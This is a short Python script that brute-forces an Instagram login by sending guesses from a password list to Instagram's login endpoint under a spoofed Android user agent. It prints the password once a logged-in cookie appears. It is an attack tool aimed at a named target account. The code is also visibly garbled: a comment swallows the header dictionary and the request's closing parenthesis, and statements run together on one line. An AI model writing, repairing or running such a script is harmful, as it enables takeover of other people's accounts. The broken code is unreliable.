import requests
import itertools

username = input("Enter the target Instagram username: ")
password_list = input("Enter the path to the password list file: ")

with open(password_list,"r", encoding="latin-1") as f:
    for password in itertools.islice(f, 50000): # Limit to 50000 attempts for demonstration purposes
        password = password.strip()

        data = {
            "username": username,
            "password": password}

        response = requests.post("https://www.instagram.com/accounts/login/ajax/", data=data,
            headers={"User-Agent":"Instagram113.0.0.37.118 Android (24/5.0; 480dpi; 1080x1920; samsung; SM-G960F; dreamqlte; samsungexynos8895; en_US)","X-Requested-With":"XMLHttpRequest","X-CSRFToken":"missing"  # Get the actual CSRF token using a browser}) if"logged_in_user" in response.cookies.get_dict():
            print(f"\nPassword found: {password}")            break
    else:
        print("\nPassword not found in the list.")
